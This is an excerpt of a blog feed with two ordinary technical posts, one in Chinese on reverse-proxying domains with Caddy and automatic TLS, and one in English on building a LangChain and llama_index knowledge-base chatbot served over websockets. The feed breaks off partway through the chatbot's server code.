    <content type="html"><![CDATA[<h1><span id="用途">用途</span></h1><p>由于服务器上部署了caddy torjan 作为代理服务器，想要配置域名时发现80端口已经被caddy占用，无法使用nginx，干掉80端口代理又无法使用，于是打算直接使用caddy反向代理域名。</p><p>配置caddy时走了一些弯路，按照官方文档配置怎么都访问不了，在此记录一下最终解决方案</p><h1><span id="弯路">弯路</span></h1><p>按照官方文档我找到了caddyFile的位置：<code>/etc/caddy/Caddyfile</code> </p><p>接着vi 编辑，如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reiner.host &#123;</span><br><span class="line">    reverse_proxy localhost:8000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存后重启caddy: <code>systemctl restart caddy.service</code> </p><p>访问配置的域名，结果发现域名访问不进来，官方的说法是，不配置前缀只配置域名，默认转发<a href="http://reiner.host/">http://reiner.host</a> 以及 <a href="https://reiner.host/">https://reiner.host</a> 的80和443端口，理论上这么配置应该没错。</p><p>这里我的版本是caddy 2.6.x </p><h1><span id="最终解决">最终解决</span></h1><p>最终我打算不再相信官方文档，手动配置每个需要转发的端口，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www.reiner.host:80 www.reiner.host:443 reiner.host:80 reiner.host:443 &#123;</span><br><span class="line">        tls reinershir@gmail.com</span><br><span class="line">        root * &#x2F;data&#x2F;pages</span><br><span class="line">        file_server</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gateway.reiner.host:80 gateway.reiner.host:443 &#123;</span><br><span class="line">        tls reinershir@gmail.com</span><br><span class="line">        reverse_proxy localhost:8000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中第一段配置是将<code>/data/pages</code>文件夹下所有文件作为HTTP服务器，通过访问如 reiner.host 或者 <a href="http://www.reiner.host/">www.reiner.host</a> 转发到 <code>/data/pages/index.html</code> </p><p>第二段是配置后台接口的地址，通过访问gateway.reiner.host 转发到本地的8000端口服务</p><p>tls 的作用是帮你申请ssl证书，这一点比nginx方便很多，当配置完重启后已经可以直接通过https访问了</p><p><strong>2023-8-26 update</strong><br>针对同一个域名，根据不同的路径转换到不同的服务，配置示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www.reiner.host:80 www.reiner.host:443 reiner.host:80 reiner.host:443 &#123;</span><br><span class="line">        tls reinershir@gmail.com</span><br><span class="line">        reverse_proxy localhost:8080</span><br><span class="line">        handle_path &#x2F;api&#x2F;user&#x2F;* &#123;</span><br><span class="line">            reverse_proxy localhost:8081</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如访问reiner.host/api/user/xxx  就会转发到服务器的8081端口</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;用途&quot;&gt;用途&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;由于服务器上部署了caddy torjan 作为代理服务器，想要配置域名时发现80端口已经被caddy占用，无法使用nginx，干掉80端口代理又无法使用，于是打算直接使用caddy反向代理域名。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="运维" scheme="https://reiner.host/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="-- caddy -- 反向代理 -- nginx " scheme="https://reiner.host/tags/caddy-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-nginx/"/>
    
  </entry>
  
  <entry>
    <title>Implementing AI customer service based on Langchain</title>
    <link href="https://reiner.host/posts/8f0289a1.html"/>
    <id>https://reiner.host/posts/8f0289a1.html</id>
    <published>2023-06-14T12:04:22.000Z</published>
    <updated>2024-12-17T12:46:36.274Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="based">Based</span></h1><ul><li><p>Langchain</p></li><li><p>llama_index &gt;=0.6.5</p></li><li><p>GPT-3.5</p></li><li><p>websockets</p></li><li><p>python &gt;=3.10</p></li></ul><p><strong>dependence</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip install llama-index</span><br><span class="line"></span><br><span class="line">pip install openai </span><br><span class="line"></span><br><span class="line">pip install langchain</span><br><span class="line"></span><br><span class="line">pip install websockets</span><br><span class="line"></span><br><span class="line">pip install pandas</span><br><span class="line"></span><br><span class="line">pip install llama-hub</span><br></pre></td></tr></table></figure><h1><span id="what-use">What use</span></h1><p>Supporting private knowledge base AI question-answering chatbot, capable of both knowledge-based Q&amp;A and casual conversation.</p><span id="more"></span><h1><span id="ai-chatbot">AI Chatbot</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> llama_index <span class="keyword">import</span> SimpleDirectoryReader, ServiceContext, GPTVectorStoreIndex, PromptHelper,StorageContext,load_index_from_storage</span><br><span class="line"><span class="keyword">from</span> llama_index.llm_predictor.chatgpt <span class="keyword">import</span> ChatGPTLLMPredictor</span><br><span class="line"><span class="keyword">from</span> langchain.chat_models <span class="keyword">import</span> ChatOpenAI</span><br><span class="line"><span class="keyword">from</span> langchain.callbacks.streaming_stdout <span class="keyword">import</span> StreamingStdOutCallbackHandler</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> llama_index.langchain_helpers.agents <span class="keyword">import</span> IndexToolConfig, LlamaIndexTool,LlamaToolkit</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> llama_index.langchain_helpers.agents <span class="keyword">import</span> create_llama_chat_agent,create_llama_agent</span><br><span class="line"><span class="keyword">from</span> llama_index.langchain_helpers.memory_wrapper <span class="keyword">import</span> GPTIndexChatMemory</span><br><span class="line">os.environ[<span class="string">&quot;OPENAI_API_KEY&quot;</span>] = <span class="string">&#x27;sk-yourOpenAiKey&#x27;</span></span><br><span class="line"><span class="keyword">from</span> langchain.memory <span class="keyword">import</span> ConversationBufferMemory</span><br><span class="line"><span class="keyword">from</span> llama_index <span class="keyword">import</span> download_loader</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_index</span>(<span class="params">directory_path</span>):</span></span><br><span class="line">    <span class="comment"># set maximum input size</span></span><br><span class="line">    max_input_size = <span class="number">4096</span></span><br><span class="line">    <span class="comment"># set number of output tokens</span></span><br><span class="line">    num_outputs = <span class="number">2000</span></span><br><span class="line">    <span class="comment"># set maximum chunk overlap</span></span><br><span class="line">    max_chunk_overlap = <span class="number">20</span></span><br><span class="line">    <span class="comment"># set chunk size limit</span></span><br><span class="line">    chunk_size_limit = <span class="number">2000</span> </span><br><span class="line">    <span class="comment">#If you don&#x27;t want a stream output,set streaming=False</span></span><br><span class="line">    llm=ChatOpenAI(temperature=<span class="number">0.4</span>, model_name=<span class="string">&quot;gpt-3.5-turbo&quot;</span>, verbose=<span class="literal">True</span>,streaming=<span class="literal">True</span>, callbacks=[StreamingStdOutCallbackHandler()])</span><br><span class="line">    llm_predictor = ChatGPTLLMPredictor(llm=llm)</span><br><span class="line">    prompt_helper = PromptHelper(max_input_size, num_outputs, max_chunk_overlap, chunk_size_limit=chunk_size_limit)</span><br><span class="line"> </span><br><span class="line">    files = os.listdir(directory_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(files) &lt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;error!&#x27;</span>+directory_path+<span class="string">&#x27; 文件夹下文件为空！&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    file_name = files[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">&quot;load index data :&quot;</span>+directory_path+<span class="string">&#x27;/&#x27;</span>+file_name)</span><br><span class="line">    <span class="comment"># If the data is in Excel format</span></span><br><span class="line">    <span class="keyword">if</span> file_name.endswith(<span class="string">&quot;.xls&quot;</span>) <span class="keyword">or</span> file_name.endswith(<span class="string">&quot;.xlsx&quot;</span>):</span><br><span class="line">        PandasExcelReader = download_loader(<span class="string">&quot;PandasExcelReader&quot;</span>)</span><br><span class="line">        loader = PandasExcelReader()</span><br><span class="line">        loader._pandas_config=&#123;<span class="string">&quot;header&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">        <span class="comment">#源码有问题，不设置默认值会报错</span></span><br><span class="line">        <span class="comment">#loader._concat_rows = True</span></span><br><span class="line">        loader._row_joiner = <span class="string">&#x27;   &#x27;</span></span><br><span class="line">        documents = loader.load_data(file=Path(directory_path+<span class="string">&#x27;/&#x27;</span>+file_name),sheet_name=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        documents = SimpleDirectoryReader(directory_path).load_data()</span><br><span class="line">    service_context = ServiceContext.from_defaults(llm_predictor=llm_predictor, prompt_helper=prompt_helper) <span class="comment">#llm_predictor=llm_predictor, </span></span><br><span class="line">    index = GPTVectorStoreIndex.from_documents(documents,service_context=service_context)</span><br><span class="line">    <span class="comment">#save on disk</span></span><br><span class="line">    index.storage_context.persist(<span class="string">&quot;D://storage&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># rebuild storage context</span></span><br><span class="line">    storage_context = StorageContext.from_defaults(persist_dir=<span class="string">&#x27;D://storage&#x27;</span>)</span><br><span class="line">    <span class="comment"># load index</span></span><br><span class="line">    index = load_index_from_storage(storage_context)</span><br><span class="line">    <span class="comment">#response_mode=&quot;compact&quot;,</span></span><br><span class="line">    query_engine = index.as_query_engine(similarity_top_k=<span class="number">30</span>,service_context=service_context) <span class="comment">#query_engine = index.as_query_engine(similarity_top_k=1,streaming=True,service_context=service_context)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#If you want to save and use the conversation record in document format, you should use GPTindexChatMemory.</span></span><br><span class="line">    <span class="comment"># memory = GPTIndexChatMemory(</span></span><br><span class="line">    <span class="comment">#     index=chat_history_index, </span></span><br><span class="line">    <span class="comment">#     memory_key=&quot;chat_history&quot;, </span></span><br><span class="line">    <span class="comment">#     query_kwargs=&#123;&quot;response_mode&quot;: &quot;compact&quot;,&quot;streaming&quot;:True,&quot;service_context&quot;:service_context,&quot;similarity_top_k&quot;:1&#125;, #,&quot;streaming&quot;:True</span></span><br><span class="line">    <span class="comment">#     # return_source returns source nodes instead of querying index</span></span><br><span class="line">    <span class="comment">#     return_source=True,</span></span><br><span class="line">    <span class="comment">#     # return_messages returns context in message format</span></span><br><span class="line">    <span class="comment">#     return_messages=True,</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#use memory save the chat history</span></span><br><span class="line">    memory = ConversationBufferMemory(</span><br><span class="line">        memory_key=<span class="string">&quot;chat_history&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    tool_config = IndexToolConfig(</span><br><span class="line">        query_engine=query_engine, </span><br><span class="line">        name=<span class="string">f&quot;AI Customer service&quot;</span>,</span><br><span class="line">        description=<span class="string">f&quot;If it is a game-related question, please use tools to obtain information before answering.If this question is about a game and you don&#x27;t know the answer, jst say &#x27;sorry,i don&#x27;t know&#x27;&quot;</span>,</span><br><span class="line">        tool_kwargs=&#123;<span class="string">&quot;return_direct&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    tool = LlamaIndexTool.from_tool_config(tool_config)</span><br><span class="line">    toolkit = LlamaToolkit(</span><br><span class="line">        index_configs=[tool],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    agent_chain = create_llama_chat_agent(</span><br><span class="line">        toolkit,</span><br><span class="line">        llm,</span><br><span class="line">        memory=memory,</span><br><span class="line">        verbose=<span class="literal">True</span>,</span><br><span class="line">        agent_kwargs=&#123;<span class="string">&quot;max_iterations&quot;</span>:<span class="number">3</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">        query = <span class="built_in">input</span>(<span class="string">&quot;What do you want to ask? &quot;</span>)</span><br><span class="line">        print(agent_chain.memory.chat_memory.messages)</span><br><span class="line">        response_stream = agent_chain.run(query)</span><br><span class="line">        <span class="comment">#if use streaming</span></span><br><span class="line">        <span class="keyword">if</span>  <span class="built_in">hasattr</span>(response_stream,<span class="string">&#x27;response_gen&#x27;</span>):</span><br><span class="line">                <span class="keyword">for</span> text <span class="keyword">in</span> response_stream.response_gen:</span><br><span class="line">                    print(text, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    <span class="comment">#todo send to client</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(response_stream)</span><br><span class="line">            </span><br><span class="line"><span class="comment">#This path is the file path of your knowledge base</span></span><br><span class="line">service_context=construct_index(<span class="string">&#x27;D://data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="integrate-websocket">Integrate WebSocket</span></h1><p>Receive questions from the client and have AI generate answers.</p><h3><span id="websocket-serverpy">websocket server.py</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> llama_index <span class="keyword">import</span> SimpleDirectoryReader, ServiceContext, PromptHelper,StorageContext,load_index_from_storage,GPTVectorStoreIndex</span><br><span class="line"><span class="keyword">from</span> langchain.chat_models <span class="keyword">import</span> ChatOpenAI</span><br><span class="line"><span class="keyword">from</span> CustomCallbackHandler <span class="keyword">import</span> CustomAsyncCallBackHandler</span><br><span class="line"><span class="keyword">from</span> llama_index.llm_predictor.chatgpt <span class="keyword">import</span> ChatGPTLLMPredictor</span><br><span class="line"><span class="keyword">from</span> llama_index.langchain_helpers.agents <span class="keyword">import</span> create_llama_chat_agent</span><br><span class="line"><span class="keyword">from</span> llama_index.langchain_helpers.memory_wrapper <span class="keyword">import</span> GPTIndexChatMemory</span><br><span class="line"><span class="keyword">from</span> llama_index.langchain_helpers.agents <span class="keyword">import</span> IndexToolConfig, LlamaIndexTool,LlamaToolkit</span><br><span class="line"><span class="keyword">from</span> langchain.memory <span class="keyword">import</span> ConversationBufferMemory</span><br><span class="line"><span class="keyword">from</span> llama_index <span class="keyword">import</span> download_loader</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&quot;OPENAI_API_KEY&quot;</span>] = <span class="string">&#x27;sk-xxx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line">logging.getLogger().addHandler(logging.StreamHandler(stream=sys.stdout))</span><br><span class="line"></span><br><span class="line">agent_cache=&#123;&#125;</span><br><span class="line">connecte_session = &#123;&#125;</span><br><span class="line">session_cache=&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_llama_chat_agent</span>(<span class="params">directory_path,project_id,session_id,prompt_name,advanced_description</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session_id <span class="keyword">not</span> <span class="keyword">in</span> agent_cache:</span><br><span class="line">        storage_path = <span class="string">&#x27;/data/index_cache/&#x27;</span>+project_id+<span class="string">&#x27;/storage&#x27;</span></span><br><span class="line">        <span class="comment"># set maximum input size</span></span><br><span class="line">        max_input_size = <span class="number">4096</span></span><br><span class="line">        <span class="comment"># set number of output tokens</span></span><br><span class="line">        num_outputs = <span class="number">2000</span></span><br><span class="line">        <span class="comment"># set maximum chunk overlap</span></span><br><span class="line">        max_chunk_overlap = <span class="number">20</span></span><br><span class="line">        <span class="comment"># set chunk size limit</span></span><br><span class="line">        chunk_size_limit = <span class="number">2000</span> </span><br><span class="line"></span><br><span class="line">        llm=ChatOpenAI(temperature=<span class="number">0.4</span>, model_name=<span class="string">&quot;gpt-3.5-turbo&quot;</span>, verbose=<span class="literal">False</span>,streaming=<span class="literal">True</span>)</span><br><span class="line">        llm_predictor = ChatGPTLLMPredictor(llm=llm)</span><br><span class="line">        prompt_helper = PromptHelper(max_input_size, num_outputs, max_chunk_overlap, chunk_size_limit=chunk_size_limit)</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line">        service_context = ServiceContext.from_defaults(llm_predictor=llm_predictor, prompt_helper=prompt_helper) <span class="comment">#llm_predictor=llm_predictor, </span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(storage_path):</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># rebuild storage context</span></span><br><span class="line">            storage_context = StorageContext.from_defaults(persist_dir=storage_path)</span><br><span class="line">            <span class="comment"># load index</span></span><br><span class="line">            index = load_index_from_storage(storage_context)</span><br><span class="line"></span><br><span class="line">            agent_cahin= get_chat_agent(index,service_context,llm,prompt_name,advanced_description)</span><br><span class="line">            agent_cache[session_id] = agent_cahin</span><br><span class="line">            <span class="keyword">return</span> agent_cahin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            files = os.listdir(directory_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(files) &lt; <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">&#x27;error!&#x27;</span>+directory_path+<span class="string">&#x27; file is null！&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            file_name = files[<span class="number">0</span>]</span><br><span class="line">            logging.info(<span class="string">&quot;load data :&quot;</span>+directory_path+<span class="string">&#x27;/&#x27;</span>+file_name)</span><br><span class="line">            <span class="comment"># if excel data format</span></span><br><span class="line">            <span class="keyword">if</span> file_name.endswith(<span class="string">&quot;.xls&quot;</span>) <span class="keyword">or</span> file_name.endswith(<span class="string">&quot;.xlsx&quot;</span>):</span><br><span class="line">                PandasExcelReader = download_loader(<span class="string">&quot;PandasExcelReader&quot;</span>)</span><br><span class="line">                loader = PandasExcelReader()</span><br><span class="line">                loader._pandas_config=&#123;<span class="string">&quot;header&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">                <span class="comment">#loader._concat_rows = True</span></span><br><span class="line">                loader._row_joiner = <span class="string">&#x27;   &#x27;</span></span><br><span class="line">                documents = loader.load_data(file=Path(directory_path+<span class="string">&#x27;/&#x27;</span>+file_name),sheet_name=<span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                documents = SimpleDirectoryReader(directory_path).load_data()</span><br><span class="line">            index = GPTVectorStoreIndex.from_documents(documents,service_context=service_context)</span><br><span class="line">            <span class="comment">#save on disk default ./storage</span></span><br><span class="line">            index.storage_context.persist(storage_path)</span><br><span class="line">            agent_cache[session_id] = get_chat_agent(index,service_context,llm,prompt_name,advanced_description)</span><br><span class="line">            <span class="keyword">return</span> agent_cache[session_id]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> agent_cache[session_id] </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chat_agent</span>(<span class="params">index,service_context,llm,prompt_name,advanced_description</span>):</span></span><br><span class="line">    <span class="comment"># memory = GPTIndexChatMemory(</span></span><br><span class="line">    <span class="comment">#     index=index, </span></span><br><span class="line">    <span class="comment">#     memory_key=&quot;chat_history&quot;, </span></span><br><span class="line">    <span class="comment">#     query_kwargs=&#123;&quot;response_mode&quot;: &quot;compact&quot;,&quot;streaming&quot;:True,&quot;service_context&quot;:service_context,&quot;similarity_top_k&quot;:1&#125;, #,&quot;streaming&quot;:True</span></span><br><span class="line">    <span class="comment">#     # return_source returns source nodes instead of querying index</span></span><br><span class="line">    <span class="comment">#     return_source=True,</span></span><br><span class="line">    <span class="comment">#     # return_messages returns context in message format</span></span><br><span class="line">    <span class="comment">#     return_messages=True,</span></span><br><span class="line">    <span class="comment">#     #chat_memory=ConversationBufferWindowMemory(return_messages=True)</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    <span class="comment">#should be create memorys for each user</span></span><br><span class="line">    memory = ConversationBufferMemory(</span><br><span class="line">        memory_key=<span class="string">&quot;chat_history&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    prompt_name=prompt_name <span class="keyword">if</span> prompt_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;AI virtual anchor&quot;</span></span><br><span class="line">    advanced_description = advanced_description <span class="keyword">if</span> advanced_description <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;You are an AI virtual anchor. If it is a game-related question, please use tools to obtain information before answering.If this question is about a game and you don&#x27;t know the answer, jst say &#x27;sorry,i don&#x27;t know&#x27;. Remember must respond in Chinese.&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;prompt name:&#x27;</span>+prompt_name+<span class="string">&quot; ,description:&quot;</span>+advanced_description)</span><br><span class="line">    tool_config = IndexToolConfig(</span><br><span class="line">        query_engine=index.as_query_engine(</span><br><span class="line">                response_mode=<span class="string">&quot;compact&quot;</span>,</span><br><span class="line">                streaming=<span class="literal">True</span>,</span><br><span class="line">                similarity_top_k=<span class="number">1</span>,service_context=service_context), </span><br><span class="line">        name=prompt_name,</span><br><span class="line">        description=advanced_description,</span><br><span class="line">        tool_kwargs=&#123;<span class="string">&quot;return_direct&quot;</span>: <span class="literal">True</span>,<span class="string">&quot;return_sources&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">        return_sources= <span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    tool = LlamaIndexTool.from_tool_config(tool_config)</span><br><span class="line">    toolkit = LlamaToolkit(</span><br><span class="line">        